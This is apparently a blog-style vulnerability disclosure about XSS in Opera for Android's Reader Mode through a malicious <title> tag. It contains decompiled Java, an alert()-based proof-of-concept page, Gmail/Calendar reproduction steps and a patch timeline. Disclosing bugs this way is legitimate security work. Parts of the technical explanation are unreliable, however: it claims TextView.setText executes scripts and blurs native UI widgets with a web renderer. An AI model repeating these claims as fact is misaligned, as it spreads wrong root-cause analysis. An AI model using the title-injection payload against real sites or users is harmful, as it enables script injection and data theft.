---
date : "2025-11-16T22:07:33+08:00"
draft : false
title : "Cross-Site Scripting in Opera Browser Reader Mode via Malicious <title> Tag (Android)"
summary : "A reflected Cross-Site Scripting (XSS) vulnerability was discovered in Opera Browser for Android’s Reader Mode due to insufficient sanitization of the HTML <title> tag, allowing attackers to execute arbitrary JavaScript, steal sensitive data, or inject malicious content"

showToc: false
TocOpen: false
hidemeta: false
comments: false
disableHLJS: true
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
markup: goldmark
goldmark:
  renderer:
    unsafe: true
---

### **Summary**
A reflected Cross-Site Scripting (XSS) vulnerability was discovered in Opera Browser for Android’s **Reader Mode** due to insufficient sanitization of the HTML `<title>` tag, allowing attackers to execute arbitrary JavaScript, steal sensitive data, or inject malicious content.


Although the Reader Mode engine (`opera-distiller://readermode`) safely distills and sanitizes the **page body**, removing scripts and unsafe elements, the **document title is extracted much earlier**, before distillation, by the native HTML parser. This unfiltered title is passed directly into the Java layer and rendered in various UI components without escaping.

As a result, an attacker can embed malicious JavaScript directly inside a `<title>` tag and have it execute **inside the Reader Mode renderer context**, even though the body content is sanitized.


### **Root Cause Analysis**

The vulnerability exists in the bridge between native C++ metadata parsing and the Java UI layer, where `<title>` content is processed **without any validation or escaping**.

#### **In ChromiumContent.java**
```java
@CalledByNative
public static void receivedHtmlMetaData(Object obj, String[] strArr) {
  Callback callback = (Callback) obj;

  if (strArr == null || strArr.length == 0) {
    callback.mo93a(Collections.emptyList());
    return;
  }

  ArrayList arrayList = new ArrayList();
  HashMap map = new HashMap();
  arrayList.add(map);

  int i = 0;
  while (i < strArr.length) {
    if (strArr[i] == null) {
      map = new HashMap();
      arrayList.add(map);
    } else {
      String str =
          strArr[i]; // ← Metadata key (e.g., "title", "og:title")
      i++;
      map.put(str, strArr[i]); // ← Raw value from native parser NO sanitization, NO escaping
                               // → "<script>alert(1)</script>", "<iframe src=...>", etc.
    }
    i++;
  }

  callback.mo93a(
      arrayList); // ← Delivers unsanitized metadata to Java UI layer
                  // → Used in tab title, address bar, history → XSS in Reader Mode
}
```
* Native C++ parses the *raw* HTML document.
* It extracts `<title>` and other metadata, then sends them as a key–value list to Java.
* **No HTML entity encoding**, **no script removal**, and **no sanitization** are performed.
* The Java layer later sets this title into UI components using methods like `TextView.setText(title)`, which allow script execution in Reader Mode.

#### **In ChromiumContent.java**
- Opera enforces distillation only for the article body:
```java
private String buildReaderModeUrl(String str, String str2) {
    return new UrlMangler.Builder("readermode",
        new Uri.Builder()
            .scheme("opera-distiller")
            .authority("readermode")
            .path(str2)
            .appendQueryParameter("ext_url", str)
            .build()
            .toString())
        .externalUrl(str)
        .displayString(m7456b().getString(R.string.reader_mode_url_override))
        .build();
}
```

* The body is sanitized by the **distiller**.
* But **metadata (including `<title>`) is extracted before distillation**, making it a bypass vector.


### **Attack Flow**

A page containing a malicious title:

```html
<title><script>alert('XSS via Opera Reader Mode Title')</script></title>
```
1. User opens an attacker-controlled page.
2. Opera's native parser extracts the `<title>` and passes it to `receivedHtmlMetaData`.
3. Java receives it as:

   ```java
   map.put("title", "<script>alert(...)</script>");
   ```
4. User activates Reader Mode.
5. Reader Mode UI renders the title, executing the embedded JavaScript.

### **Proof of Concept (PoC)**

One reliable vector is **Google Calendar tasks**, which allow custom text that gets embedded into HTML titles.

```html
<!DOCTYPE html>
<html>
<head>
  <title><script>alert('XSS in Opera Reader Mode - ' + document.domain)</script></title>
</head>
<body>
  <article>
    <h1>Fake News Headline</h1>
    <p>Engaging content to lure Reader Mode activation...</p>
  </article>
</body>
</html>
```

### **Steps to Reproduce**

1. Create a task with this title:

   ```html
   <script>alert('XSS in Opera Reader Mode - ' + document.domain)</script>
   ```
2. Email the task to yourself (produces a shareable Gmail link).
3. Extract the message ID from the shared link.
4. Visit the constructed URL:

   ```
   https://mail.google.com/mail/u/0/#inbox/[MESSAGE_ID]?ogbl
   ```
5. Open the link in Opera Browser for Android.
6. Enable Reader Mode.
7. Observe:

   * Clean article body (distilled).
   * JavaScript alert executes immediately due to the unsanitized title.

### **Disclosure Timeline**

* **September 21, 2020** — Vulnerability discovered
* **September 23, 2020** — Reported to Opera Security
* **September 25, 2020** — Vendor acknowledged issue
* **September 29, 2020** — Patch released